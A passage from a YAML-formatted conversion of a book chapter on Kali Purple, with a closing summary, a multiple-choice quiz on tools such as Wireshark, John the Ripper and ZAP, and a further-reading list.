+    access tools with our plethora of scanners and password-cracking utilities. This
+    was just a taste, folks. These are the tools that Kali Purple was built to inherently
+    support. That does not by any means suggest they are the only tools that could
+    be of use within the Kali Purple environment – the Kali Linux operating system
+    is designed to accommodate the customized contributions of others. That’s what
+    keeps any software community running strong.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the next chapter – our final chapter, we are going to assemble some of the
+    odds-and-ends features of Kali Purple that didn’t fully belong in the other areas.
+    This should bring you to the end of your journey and complete your introduction
+    to Kali Purple.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Questions
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 'Answer the following questions to test your knowledge of this chapter:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Which stage of a cyberattack would be using the scanning tools we discussed
+    belong to?
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Payload delivery
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Exploitation
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Recovery
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Reconnaissance
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: What is Wireshark?
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: A protocol analyzer
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: A Mafia-linked loan officer
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: A physical cable tap
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: A network packet generator
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: What is John the Ripper?
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Jack’s older brother
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: A password and hash-cracking utility
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: A network packet disassembler
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: A WAF bypass exploit
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: What do you suppose would happen if the password you are trying to crack isn’t
+    on the wordlist that’s being invoked by your cracking utility?
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: The utility will automatically restart using values from the next wordlist in
+    the directory
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: The utility will complete the scan from the wordlist and then just make random
+    stuff up, trying to guess the password
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: The password will not be successfully cracked, and you’ll need to find another
+    list or method to complete your objective
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: The password-cracking utility will become enraged and automatically switch to
+    brute force via dictionary and fuzz value testing
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Which utility is most like ZAP?
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Google Chrome
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Mozilla Firefox
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Portswigger
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Burp Suite
+  prefs:
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Further reading
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 'To learn more about the topics that were covered in this chapter, take a look
+    at the following resources:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**Global Information Assurance Wireshark** **paper**: [https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.29.pdf](https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.29.pdf)'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**What Is Wireshark and How Is It** **Used?**: [https://www.comptia.org/content/articles/what-is-wireshark-and-how-to-use-it](https://www.comptia.org/content/articles/what-is-wireshark-and-how-to-use-it)'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Tenable’s Nessus vulnerability** **scanner**:  [https://www.tenable.com/products/nessus](https://www.tenable.com/products/nessus)'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
